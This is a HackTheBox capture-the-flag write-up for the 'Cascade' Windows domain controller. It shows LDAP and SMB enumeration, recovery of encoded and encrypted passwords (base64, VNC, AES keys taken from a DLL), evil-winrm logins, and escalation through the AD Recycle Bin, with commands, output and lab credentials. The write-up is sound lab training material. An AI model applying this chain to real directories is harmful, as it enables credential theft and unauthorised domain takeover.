---
date: 2020-07-25 23:48:05
layout: post
title: HackTheBox Cascade Writeup
subtitle: Hackthebox Cascade Writeup.
description: >-
  in this blog i've explained how to solve Cascade machine in hackthebox
image: https://i.ibb.co/bPZkvcG/cascade.png
optimized_image: https://i.ibb.co/bPZkvcG/cascade.png
category: hackthebox
tags:
  - hackthebox
  - Cascade
author: Ahmed Fatouh
paginate: true
---


# [](#header-1) Methodology:
* Enumeration.
* Find Credentials. 
* Login with evil-winrm.
* Privilege Escalation.

# [](#header-1) Nmap:

we will start with nmap to scan for ports and it's services.

```ruby
nmap -sC -sV -Pn 10.10.10.182 -oN scan.txt 
Nmap scan report for 10.10.10.182
Host is up (0.52s latency).
Not shown: 987 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-19 07:22:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -35s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-19T07:23:35
|_  start_date: 2020-04-19T06:31:56

```
# [](#header-1)LDAP Enumeration:

from the nmap scan we found that this machine hava an LDAP,
what is LDAP? LDAP stands for Lightweight Directory Access Protocol
we will use ldapsearch in this part.

```ruby
ldapsearch -x -H ldap://10.10.10.182 -b "dc=cascade, dc=local"

# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200425201507.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 319569
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 6
codePage: 0
countryCode: 0
badPasswordTime: 132323343708508537
lastLogoff: 0
lastLogon: 132323260744754819
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132323193077396971
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

# {4026EDF8-DBDA-4AED-8266-5A04B80D9327}, Policies, System, cascade.local
dn: CN={4026EDF8-DBDA-4AED-8266-5A04B80D9327},CN=Policies,CN=System,DC=cascade
 ,DC=local

# {D67C2AD5-44C7-4468-BA4C-199E75B2F295}, Policies, System, cascade.local
dn: CN={D67C2AD5-44C7-4468-BA4C-199E75B2F295},CN=Policies,CN=System,DC=cascade
 ,DC=local


```

# [](#header-2)First User:

from the LDAP search i found the credentilas for the user "Ryan Thompson" 

* cascadeLegacyPwd: clk0bjVldmE= "This is the password of r.thompson" decode it with any base64 decoder.

![](https://i.ibb.co/m4shZHr/ldapsearch.png)

* r.thompson:rY4n5eva

# [](#header-1)SMB Enumeration:

after i find this credentials i used it for enum smb shares and i found the seconed creds for the seconed user.

* i used smbclient for smb enum shares.
* i found share with name 'Data' and i found VNC file which is belong to 's.smith' the seconed user.
* decrypt the VNC file and we will found that the password of 's.smith' is : sT333ve2

![](https://i.ibb.co/H7R21tc/vnc.png)

* To decrypt the VNC file use this [Tool](http://hl.altervista.org/split.php?http://aluigi.altervista.org/pwdrec/vncpwd.zip)


# [](#header-1) Login via evil-winrm:

* now after we got the password of the 's.smith' user i used it to login via evil-winrm .

```ruby
ruby evil-winrm.rb -u 's.smith' -p 'sT333ve2' -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents>

```
* now let's read the user flag.

![](https://i.ibb.co/mT4ZvXQ/userflag.png)


# [](#header-1) Got The Third User:

* i tried to privilege escalation to the administrator but a failed so i think that i should go the third user .
* after some enumeration i found DB file which contain the creds of the third user.
* go to 'C:\Shares\Audit\DB' and i downloaded  the db file and extracted the creds from it.

```ruby
*Evil-WinRM* PS C:\Shares\Audit\DB> download Audit.db
Info: Downloading C:\Shares\Audit\DB\Audit.db to Audit.db
                                                             
Info: Download successful!
```
* let's open the file in online DB viewer using this website . [SQL Online IDE](https://sqliteonline.com/).

* select open file then >> type 'SELECT * FROM LDAP;' 

![](https://i.ibb.co/2FZn7xy/ark.png)

* pingo! now we have the password of the third user , it's encoded in AES encryption  , let's decode it.

* now after some enumeration .

```ruby
*Evil-WinRM* PS C:\> cd Shares/Audit
*Evil-WinRM* PS C:\Shares\Audit> ls


    Directory: C:\Shares\Audit


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/28/2020   9:40 PM                DB
d-----        1/26/2020  10:25 PM                x64
d-----        1/26/2020  10:25 PM                x86
-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
-a----        1/28/2020  11:29 PM             45 RunAudit.bat
-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll

```
* i downloaded the file CascCrypto.dll and open it with ida and i found the 'IV' and the 'Secret Key'
* secret-key = "c4scadek3y654321"
* initialization vector = "1tdyjCbY1Ix49842"

![](https://i.ibb.co/5FcSKxN/iv.jpg)

* now open this [site](https://www.devglan.com/online-tools/aes-encryption-decryption)

![](https://i.ibb.co/9hRqtQG/decoder.png)

* Tha Password is : w3lc0meFr31nd.

* Let's Login with evil-winrm again:

```ruby
xdev05@XDev05:~/Documents/HTB/Cascade/evil-winrm$ ruby evil-winrm.rb -u 'Arksvc' -p 'w3lc0meFr31nd' -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> 

```

# [](#header-1) Privilege Escalation:

* type whoami/all first.
* type whoami/groups.

```ruby
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

* now we got it >> from the seconed command we found our point to escalate to the admin and this is the 'AD Recycle Bin' Group.
```ruby 
The Active Directory Recycle Bin was introduced in the Windows Server 2008 R2 release. The goal of this feature was to facilitate the recovery of deleted Active Directory objects without requiring restoration of backups, restarting Active Directory Domain Services, or rebooting domain controllers. To accomplish these goals, the AD Recycle Bin introduced changes to the behavior of the Active Directory object deletion lifecycle.
```
* follow this [blog](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)

* type this command >> "Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property * "

![](https://i.ibb.co/g3gY7tz/adminpass.png)

* cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz.
* this is the administrator password , it's encoded in base64 .
* Administrator : baCT3r1aN00dles 
* we are done here !

![](https://i.ibb.co/LggkFXh/admin.png)

* if you want support me to do more WriteUp's buy me a coffe : [https://www.buymeacoffee.com/XDev05]()

 <script src="https://www.hackthebox.eu/badge/103789"></script>


